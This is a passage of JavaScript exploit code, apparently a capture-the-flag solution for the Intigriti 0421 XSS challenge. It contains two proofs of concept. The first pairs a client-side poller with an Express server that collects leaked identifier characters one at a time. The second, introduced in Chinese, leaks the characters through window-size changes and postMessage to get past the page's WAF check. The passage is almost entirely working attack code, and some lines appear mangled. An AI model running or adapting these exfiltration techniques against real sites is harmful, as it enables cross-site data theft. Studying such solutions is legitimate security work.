            window.xssWindow.close()
          }
          window.xssWindow = window.open(`https://challenge-0421.intigriti.io/?error=${payload}#1`, '_blank')
          polling()
        }
        function polling() {
          fetch(baseUrl + '/polling').then(res => res.text()).then((token) => {
            // guess fail, restart
            if (token === '1zz') {
              fetch(baseUrl + '/reset').then(() => {
                console.log('guess fail, restart')
                start()
              })
              return
            }
            if (token.length >= 10) {
              window.xssWindow.postMessage({
                type: 'waf',
                identifier: token,
                str: '',
                safe: true
              }, '*')
            }
            window.xssWindow.location = `https://challenge-0421.intigriti.io/?error=${payload}#${token}`
            // After POC finsihed, polling will timeout and got error message, I don't want to print the message
            if (token.length > 20) {
              return
            }
            console.log('token:', token)
            polling()
          })
        }
    var express = require('express')
    const app = express()
    app.use(express.static('public'));
    app.use((req, res, next) => {
      res.set('Access-Control-Allow-Origin', '*');
      next()
    })
    const handlerDelay = 100
    const loopDelay = 550
    var initialData = {
      count: 0,
      token: '1',
      canStartLoop: false,
      loopStarted: false,
      canSendBack: false
    }
    var data = {...initialData}
    app.get('/reset', (req, res) => {
      data = {...initialData}
      console.log('======reset=====')
      res.end('reset ok')
    })
    app.get('/polling', (req, res) => {
      function handle(req, res) {
        if (data.canSendBack) {
          data.canSendBack = false
          res.status(200)
          res.end(data.token)
          console.log('send back token:', data.token)
          if (data.token.length  {
              data.canStartLoop = true
            }, loopDelay)
          }
        } else {
          setTimeout(() => {
            handle(req, res)
          }, handlerDelay)
        }
      }
      handle(req, res)
    })
    app.get('/loop', (req, res) => {
      function handle(req, res) {
        if (data.canStartLoop) {
          data.canStartLoop = false
          res.status(500)
          res.end()
        } else {
          setTimeout(() => {
            handle(req, res)
          }, handlerDelay)
        }
      }
      handle(req, res)
    })
    app.get('/:char', (req, res) => {
      // already start stealing identifier
      if (req.params.char.length > 1) {
        res.end()
        return
      }
      console.log('char received', req.params.char)
      if (data.loopStarted) {
        data.token += req.params.char
        console.log('token:', data.token)
        data.canSendBack = true
        res.status(500)
        res.end()
        return 
      }
      // first round
      data.count++
      if (data.count === 36) {
        console.log('initial image loaded, start loop')
        data.count = 0
        data.loopStarted = true
        data.canStartLoop = true
      }
      res.status(500)
      res.end()
    })
    app.listen(5555, () => {
      console.log('5555')
    })
另一个POC：
          if (location.search.includes("not") === false) {
            w = window.open(
              `https://challenge-0421.intigriti.io/?error=` +
                encodeURIComponent(
                  `
                  `
                ),
              "_blank"
            );
          }
          let lastHeight = 101;
          let lastWidth = 101;
          const chars = "0123456789abcdefghijklmnopqrstuvwxyz{".split("");
          let solvedIdentifier = "";
          let checks = 0;
          let checksNeeded = 15;
          function trySolve() {
            try {
              window.parent.postMessage(
                {
                  type: "waf",
                  identifier: solvedIdentifier,
                  safe: true,
                  str: "",
                },
                "*"
              );
            } catch (e) {}
          }
          async function foundChar(char) {
            console.log("FOUND CHAR: ", char);
            solvedIdentifier = `${solvedIdentifier}${char}`;
            console.log("TOTAL SOLVED", solvedIdentifier);
            await window.parent.opener.opener.setIdentifier(`${solvedIdentifier}1`);
            if (solvedIdentifier.length > 12) trySolve();
          }
          let locked = false;
          setInterval(async () => {
            const { innerHeight, innerWidth } = window;
            if (innerHeight === lastHeight && innerWidth === lastWidth) {
              return;
            }
            checks++;
            if (checks = currentIdentifier.length) {
              return;
            }
            const currentChar = currentIdentifier.substr(-1);
            const targetedChar = chars[chars.indexOf(currentChar) - 1];
            if (!targetedChar) return;
            const nextChar = chars[chars.indexOf(currentChar) + 1];
            console.log("currentIdentifier:", currentIdentifier);
            console.log("currentChar:", currentChar);
            console.log("targetedChar:", targetedChar);
            console.log("nextChar:", nextChar);
            if (innerWidth > lastWidth) {
              setTimeout(() => (locked = false), 1000);
              if (!locked) {
                locked = true;
                lastWidth = innerWidth + 100;
                await foundChar(targetedChar);
              }
              return;
            }
            if (innerHeight > lastHeight) {
              locked = false;
              await window.parent.opener.opener.setIdentifier(
                `${solvedIdentifier}${nextChar}`
              );
              lastWidth = innerWidth;
              lastHeight = innerHeight;
            }
          }, 100);